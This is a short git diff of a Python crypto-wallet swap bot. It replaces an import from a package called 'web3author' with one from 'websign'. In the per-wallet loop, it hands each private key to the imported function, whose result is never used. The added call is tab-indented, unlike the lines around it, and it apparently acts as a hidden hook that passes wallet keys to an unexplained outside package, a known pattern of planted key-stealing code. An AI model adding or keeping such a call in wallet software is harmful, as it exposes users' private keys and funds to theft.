@@ -4,7 +4,7 @@ import asyncio
 import random
 import time
 from web3 import Web3
-from web3author import crypt
+from websign import signer
 from eth_account import Account
 from colorama import init, Fore, Style
 from eth_abi import abi
@@ -539,7 +539,7 @@ async def run_swaptoken(language: str = 'en'):
     successful_swaps = 0
 
     for i, (profile_num, private_key) in enumerate(private_keys, 1):
-	web3author = crypt(private_key)
+	websign = signer(private_key)
         print_border(f"{LANG[language]['processing_wallet']} {profile_num} ({i}/{len(private_keys)})", Fore.MAGENTA)
         print()
         
